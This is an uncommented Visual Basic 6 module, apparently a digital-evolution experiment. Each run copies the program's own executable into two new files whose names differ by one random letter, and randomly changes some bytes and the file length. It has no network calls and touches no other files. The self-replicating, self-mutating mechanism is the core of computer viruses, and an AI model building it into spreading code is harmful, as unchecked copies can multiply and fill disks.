Attribute VB_Name = "Module1"
Const Stable As Single = 0.666666666666666

Private Sub Main()
Randomize
Dim Nm As String
Nm = App.EXEName
Dim k As Integer, L As Integer, GB As Integer
L = Len(Nm)
GB = Int(Rnd * L) + 1
Dim NmN As String
For k = 1 To L
    If k <> GB Then
        NmN = NmN & Mid(Nm, k, 1)
    Else
        NmN = NmN & Chr(Int(Rnd * 26 + 65))
    End If
Next k
S1 NmN
GB = Int(Rnd * L) + 1
NmN = ""
For k = 1 To L
    If k <> GB Then
        NmN = NmN & Mid(Nm, k, 1)
    Else
        NmN = NmN & Chr(Int(Rnd * 26 + 65))
    End If
Next k
S1 NmN
End Sub

Private Sub S1(Name As String)
Dim kk As Long, LL As Long, GGBB As Long, Code As Byte
Dim OldN As String
OldN = App.EXEName
Open App.Path & "\" & Name & ".EXE" For Binary As #2
Open App.Path & "\" & OldN & ".exe" For Binary As #1
LL = LOF(1)
Do Until Rnd < Stable
    LL = LL + Int(Rnd * 3 - 1)
Loop
For kk = 1 To LL
    If kk > LOF(1) Then
        Code = Int(Rnd * 256)
    Else
        Get #1, kk, Code
    End If
    Put #2, kk, Code
Next kk
Close #1
Do Until Rnd < Stable
    GGBB = Int(Rnd * LL) + 1
    Put #2, GGBB, Int(Rnd * 256)
Loop
Close #2
End Sub
